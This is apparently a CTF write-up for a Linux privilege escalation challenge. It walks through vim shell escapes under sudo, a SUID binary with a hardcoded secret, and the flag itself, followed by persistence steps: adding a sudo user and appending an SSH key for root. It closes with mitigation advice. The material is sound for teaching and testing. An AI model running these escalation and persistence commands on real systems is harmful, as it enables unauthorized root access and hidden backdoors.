# Sudovest - Privilege Escalation CTF Challenge

## Challenge Information

- **Challenge Name:** Sudovest
- **Category:** Linux Privilege Escalation
- **Difficulty:** Medium
- **Points:** 300
- **Tags:** `privilege-escalation`, `linux`, `sudo`, `vim`, `suid`, `binary-exploitation`

## Challenge Overview

Sudovest is a medium-level Linux privilege escalation challenge that tests your ability to identify and exploit misconfigurations in sudo permissions and SUID binaries. The challenge requires a solid understanding of Linux file permissions, binary analysis, and privilege escalation techniques.

### Scenario

You have gained SSH access to a target system with a low-privileged user account. Your goal is to escalate your privileges to root and capture the flag located in `/root/flag.txt`.

### Initial Access

- **Username:** challenger
- **SSH Port:** 22
- **Target IP:** (provided in challenge instance)

## Step-by-Step Exploitation

### Step 1: SSH Access and Initial Reconnaissance

First, connect to the target system using the provided credentials:

```bash
ssh challenger@<target-ip>
Password: [provided-password]
```

Once connected, perform basic enumeration:

```bash
whoami
id
pwd
ls -la
```

**Output:**
```
challenger
uid=1000(challenger) gid=1000(challenger) groups=1000(challenger)
/home/challenger
```

### Step 2: Sudo Privilege Enumeration

Check what commands the current user can run with sudo:

```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for challenger on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User challenger may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim
```

**Key Finding:** The user can run `vim` as root without a password!

### Step 3: Privilege Escalation via Vim

Vim has a well-known feature that allows command execution. We can exploit this to escalate privileges:

**Method 1: Direct Shell Escape**

```bash
sudo vim
```

Once vim opens, type:
```
:!/bin/bash
```

This spawns a root shell!

**Method 2: Using Vim's Shell Command**

```bash
sudo vim -c ':!/bin/bash'
```

Alternatively, use:
```bash
sudo vim -c ':shell'
```

**Method 3: GTFOBins Technique**

```bash
sudo vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

After executing any of these methods, verify root access:

```bash
whoami
# Output: root
id
# Output: uid=0(root) gid=0(root) groups=0(root)
```

### Step 4: SUID Binary Enumeration (Alternative Path)

If the sudo method wasn't available, we could also check for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Output:**
```
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/local/bin/sudovest
```

**Interesting Finding:** A custom binary `/usr/local/bin/sudovest` with SUID bit set!

### Step 5: Custom Binary Analysis

Examine the custom SUID binary:

```bash
ls -la /usr/local/bin/sudovest
file /usr/local/bin/sudovest
```

**Output:**
```
-rwsr-xr-x 1 root root 16728 Oct 10 2025 /usr/local/bin/sudovest
/usr/local/bin/sudovest: ELF 64-bit LSB executable
```

Run the binary to see its behavior:

```bash
/usr/local/bin/sudovest
```

**Output:**
```
Welcome to Sudovest!
Enter the secret code: test
Invalid code!
```

### Step 6: Exploiting the Custom Binary

Use `strings` to analyze the binary:

```bash
strings /usr/local/bin/sudovest
```

**Key Findings:**
```
Welcome to Sudovest!
Enter the secret code:
v3st_s3cr3t_2025
Access granted! Spawning root shell...
/bin/bash
```

Now exploit the binary with the discovered secret:

```bash
/usr/local/bin/sudovest
# Enter: v3st_s3cr3t_2025
```

**Output:**
```
Access granted! Spawning root shell...
# whoami
root
```

### Step 7: Flag Capture

With root access obtained (via either method), retrieve the flag:

```bash
cat /root/flag.txt
```

**Flag:**
```
CTF{sud0_v1m_pr1v3sc_m4st3r_2025}
```

### Step 8: Persistence (Optional Educational Step)

For educational purposes, here are common persistence techniques:

**Add a new user with root privileges:**
```bash
adduser hacker
usermod -aG sudo hacker
```

**Add SSH key:**
```bash
mkdir -p /root/.ssh
echo "your-public-key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

**Note:** Never perform these actions on systems you don't own or have explicit permission to test!

## Learning Objectives

This challenge teaches several important concepts:

### 1. **Sudo Misconfiguration Exploitation**
   - Understanding sudo privileges with `sudo -l`
   - Identifying dangerous sudo permissions
   - Exploiting text editors (vim, nano, etc.) with sudo access
   - Using GTFOBins as a reference for exploitation techniques

### 2. **SUID Binary Enumeration**
   - Finding SUID binaries using `find` command
   - Understanding the SUID bit and its security implications
   - Identifying unusual/custom SUID binaries

### 3. **Binary Analysis**
   - Using `file` command for binary type identification
   - Using `strings` to extract readable data from binaries
   - Static analysis techniques for vulnerability discovery

### 4. **Privilege Escalation Methodology**
   - Systematic enumeration approach
   - Multiple exploitation paths
   - Verification of successful escalation
   - Proper flag capture

### 5. **Linux Security Concepts**
   - File permissions and special bits (SUID/SGID/Sticky)
   - Command execution contexts
   - Shell escaping techniques
   - Secure configuration best practices

## Prevention and Mitigation

### For System Administrators:

1. **Sudo Configuration:**
   - Avoid granting sudo access to text editors (vim, nano, emacs)
   - Use `sudoedit` instead of allowing direct editor access
   - Regularly audit sudo permissions with `visudo`
   - Follow principle of least privilege

2. **SUID Binaries:**
   - Minimize the number of SUID binaries
   - Regularly audit SUID/SGID files
   - Remove SUID bit from unnecessary binaries
   - Never set SUID on custom scripts or untested binaries

3. **Security Hardening:**
   - Implement AppArmor or SELinux policies
   - Use security auditing tools (Lynis, Tiger)
   - Enable logging and monitoring
   - Keep systems updated

## Tools and Resources

### Essential Tools:
- `sudo -l` - List sudo privileges
- `find` - Locate SUID binaries
- `strings` - Extract strings from binaries
- `file` - Identify file types
- `vim` - Text editor with shell escape capabilities

### References:
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries for privilege escalation
- [PWNTOOLS](https://docs.pwntools.com/) - Binary exploitation framework
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) - Linux privilege escalation enumeration
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Privilege escalation payloads

## Tags and Categories

- **Difficulty:** Medium
- **Category:** Privilege Escalation
- **Platform:** Linux
- **Techniques:** 
  - Sudo Exploitation
  - Vim Shell Escape
  - SUID Binary Analysis
  - String Extraction
  - Binary Exploitation
- **Skills Required:**
  - Linux Command Line
  - Basic Binary Analysis
  - Security Enumeration
  - Privilege Escalation Concepts

## Additional Practice

If you enjoyed this challenge, try these similar ones:

1. **Easy Level:**
   - Basic sudo misconfiguration challenges
   - Simple SUID binary exploitation
   - PATH hijacking exercises

2. **Medium Level:**
   - Kernel exploitation challenges
   - Capability-based escalation
   - Cron job exploitation

3. **Hard Level:**
   - Advanced binary exploitation with ASLR
   - Race condition exploits
   - Container escape scenarios

## Conclusion

The Sudovest challenge demonstrates the critical importance of proper privilege management in Linux systems. Both sudo misconfigurations and poorly secured SUID binaries can lead to complete system compromise. As a penetration tester or security professional, always enumerate thoroughly and check multiple escalation vectors.

**Remember:** These techniques should only be used in authorized testing environments, CTF competitions, or systems you own. Unauthorized access to computer systems is illegal.

---

**Challenge Author:** CTF Challenges Team  
**Last Updated:** October 2025  
**Version:** 1.0
